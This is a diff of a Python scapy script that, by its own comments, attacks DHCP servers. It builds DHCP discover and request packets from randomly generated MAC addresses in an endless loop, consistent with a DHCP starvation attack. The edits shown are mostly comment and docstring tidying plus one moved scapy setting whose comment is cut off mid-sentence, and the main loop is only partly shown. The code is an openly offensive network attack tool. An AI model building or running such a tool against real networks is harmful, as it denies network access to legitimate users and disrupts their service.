@@ -20,24 +20,26 @@ if args.iface:
 else:
     interface = conf.iface
 
-#check if the user asked to attack a specific DHCP server, if not attack the first to answer (all of them)
+# Check if the user asked to attack a specific DHCP server, if not attack the first to answer (all of them)
 if args.target:
     use_specific_server = True
     server_ip = args.target
 else:
     use_specific_server = False
 
+conf.checkIPaddr = False # Tell scapy not to care if the answer is not from the IP we
+
 def random_mac() -> str:
-    """ function for creating a random MAC address """
-    base_16  = list(range(10)) + ['A', 'B', 'C', 'D', 'E', 'F'] # all the digits in the Hexadecimal bace
+    """ Function for creating a random MAC address """
+    base_16  = list(range(10)) + ['A', 'B', 'C', 'D', 'E', 'F'] # All the digits in the Hexadecimal base
     mac = str(random.choice(base_16)) + str(random.choice(base_16))
     for i in range(5):
         mac += str(":" + str(random.choice(base_16)) + str(random.choice(base_16)))
     return mac
 
 def create_discover(mac):
-    """ a function for creating a DHCP discover message given a mac address for source """
-    # create a random xid
+    """ A function for creating a DHCP discover message given a mac address for source """
+    # Create a random xid
     xid_random = random.randint(1, 900000000)
     return (
             Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
@@ -48,8 +50,9 @@ def create_discover(mac):
     )
 
 def create_request(response, mac):
-    offer_ip = response[BOOTP].yiaddr
-    server_ip = response[IP].src
+    """ A function for creating a DHCP request message given a DHCP offer response and a mac address for source """
+    offer_ip   = response[BOOTP].yiaddr
+    server_ip  = response[IP].src
     chaddr_mac = response[BOOTP].chaddr
     xid_random = response[BOOTP].xid
     return  (
@@ -63,9 +66,9 @@ def create_request(response, mac):
                 ("server_id", server_ip),
                 "end"])
     )
-conf.checkIPaddr = False # tell scapy not to care if the answer is not from the IP we send it to
 
 def main():
+    """ Main function block """
     if not use_specific_server:
         while True:
             mac = random_mac()
